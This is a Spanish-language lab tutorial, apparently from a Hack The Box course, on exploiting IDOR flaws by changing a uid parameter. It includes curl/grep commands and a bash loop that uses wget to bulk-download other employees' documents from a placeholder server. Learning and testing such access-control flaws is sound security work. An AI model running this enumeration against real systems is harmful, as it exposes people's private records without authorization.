# Mass IDOR Enumeration

Explotar las vulnerabilidades de IDOR es fácil en algunos casos, pero puede ser muy desafiante en otros. Una vez que identificamos un posible IDOR, podemos comenzar a probarlo con técnicas básicas para ver si expondría otros datos. En cuanto a los ataques IDOR avanzados, necesitamos comprender mejor cómo funciona la aplicación web, cómo calcula sus referencias de objetos y cómo funciona su sistema de control de acceso para poder realizar ataques avanzados que pueden no ser explotables con las técnicas básicas.

Comencemos a discutir varias técnicas de explotar las vulnerabilidades IDOR, desde la enumeración básica hasta la recopilación de datos masivos, la escalada de privilegios del usuario.

---

# **Parámetros inseguros**

Comencemos con un ejemplo básico que muestra una vulnerabilidad típica de IDOR. El ejercicio a continuación es un`Employee Manager`Aplicación web que aloja registros de empleados:

![](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_employee_manager.jpg)

Nuestra aplicación web supone que estamos registrados como empleados con ID de usuario`uid=1`para simplificar las cosas. Esto requeriría que iniciamos sesión con credenciales en una aplicación web real, pero el resto del ataque sería el mismo. Una vez que hagamos clic en`Documents`, somos redirigidos a

`/documents.php`:

![](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_documents.jpg)

Cuando llegamos al`Documents`Página, vemos varios documentos que pertenecen a nuestro usuario. Estos pueden ser cargados por nuestro usuario o archivos establecidos para nosotros por otro departamento (por ejemplo, departamento de recursos humanos). Comprobando los enlaces de archivo, vemos que tienen nombres individuales:

Código:html

```html
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf

```

Vemos que los archivos tienen un patrón de nomenclatura predecible, ya que los nombres de los archivos parecen estar utilizando el usuario`uid`y el mes/año como parte del nombre del archivo, que puede permitirnos borrar archivos para otros usuarios. Este es el tipo más básico de vulnerabilidad IDOR y se llama`static file IDOR`. Sin embargo, para eliminar con éxito otros archivos, asumimos que todos comienzan con`Invoice`o`Report`, que puede revelar algunos archivos pero no todos. Entonces, busquemos una vulnerabilidad más sólida de IDOR.

Vemos que la página está configurando nuestro`uid`con un`GET`parámetro en la URL como (`documents.php?uid=1`). Si la aplicación web usa esto`uid`Obtenga el parámetro como referencia directa a los registros de los empleados que debe mostrar, podemos ver los documentos de otros empleados simplemente cambiando este valor. Si el final de la aplicación web`does`tener un sistema de control de acceso adecuado, obtendremos alguna forma de`Access Denied`. Sin embargo, dado que la aplicación web pasa como nuestra`uid`En el texto claro como referencia directa, esto puede indicar un diseño de aplicaciones web deficientes, lo que lleva al acceso arbitrario a los registros de los empleados.

Cuando intentamos cambiar el`uid`a`?uid=2`, no notamos ninguna diferencia en la salida de la página, ya que todavía estamos obteniendo la misma lista de documentos, y podemos suponer que todavía devuelve nuestros propios documentos:

![](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_documents.jpg)

Sin embargo,`we must be attentive to the page details during any web pentest`Y siempre vigile el código fuente y el tamaño de la página. Si miramos los archivos vinculados, o si hacemos clic en ellos para verlos, notaremos que estos son realmente diferentes archivos, que parecen ser los documentos que pertenecen al empleado con`uid=2`:

Código:html

```html
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf

```

Este es un error común que se encuentra en las aplicaciones web que sufren de vulnerabilidades IDOR, ya que colocan el parámetro que controla qué documentos del usuario muestra bajo nuestro control sin tener un sistema de control de acceso en el back-end. Otro ejemplo es usar un parámetro de filtro para mostrar solo los documentos de un usuario específicos (por ejemplo,`uid_filter=1`), que también se puede manipular para mostrar los documentos de otros usuarios o incluso completamente eliminados para mostrar todos los documentos a la vez.

---

# **Enumeración masiva**

Podemos intentar acceder manualmente a otros documentos de los empleados con`uid=3`, `uid=4`, etcétera. Sin embargo, acceder manualmente a los archivos no es eficiente en un entorno de trabajo real con cientos o miles de empleados. Entonces, podemos usar una herramienta como`Burp Intruder`o`ZAP Fuzzer`Para recuperar todos los archivos o escribir un pequeño script bash para descargar todos los archivos, que es lo que haremos.

Podemos hacer clic en [`CTRL+SHIFT+C`] en Firefox para habilitar el`element inspector`, y luego haga clic en cualquiera de los enlaces para ver su código fuente HTML, y obtendremos lo siguiente:

Código:html

```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li><li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

Podemos elegir cualquier palabra única para poder`grep`el enlace del archivo. En nuestro caso, vemos que cada enlace comienza con`<li class='pure-tree_link'>`, así que podemos`curl`la página y`grep`Para esta línea, como sigue:

Enumeración de masa idor

```
xnoxos@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>

```

Como podemos ver, pudimos capturar los enlaces del documento con éxito. Ahora podemos usar comandos BASH específicos para recortar las piezas adicionales y solo obtener los enlaces de documento en la salida. Sin embargo, es una mejor práctica usar un`Regex`patrón que coincide con las cadenas entre`/document`y`.pdf`, que podemos usar con`grep`Para obtener solo los enlaces del documento, como sigue:

Enumeración de masa idor

```
xnoxos@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf

```

Ahora podemos usar un simple`for`bucle para bucle sobre el`uid`parámetro y devolver el documento de todos los empleados, y luego usar`wget`Para descargar cada enlace de documento:

Código:intento

```bash
#!/bin/bashurl="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done

```

Cuando ejecutamos el guión, descargará todos los documentos de todos los empleados con`uids`Entre 1-10, explotando con éxito la vulnerabilidad IDOR para enumerar en masa los documentos de todos los empleados. Este script es un ejemplo de cómo podemos lograr el mismo objetivo. Intente usar una herramienta como Burp Intruder o Zap Fuzzer, o escriba otro script Bash o PowerShell para descargar todos los documentos.